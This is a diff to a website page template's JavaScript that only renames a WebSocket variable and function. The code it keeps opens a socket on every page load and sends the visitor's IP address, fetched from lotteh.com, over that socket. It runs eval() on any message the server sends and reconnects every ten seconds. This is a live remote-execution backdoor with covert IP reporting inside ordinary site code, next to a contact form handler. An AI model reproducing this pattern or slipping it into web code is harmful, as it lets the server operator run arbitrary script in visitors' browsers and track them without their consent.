@@ -137,32 +137,32 @@
             {% endif %}
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://{{ base_domain }}"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://{{ base_domain }}"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
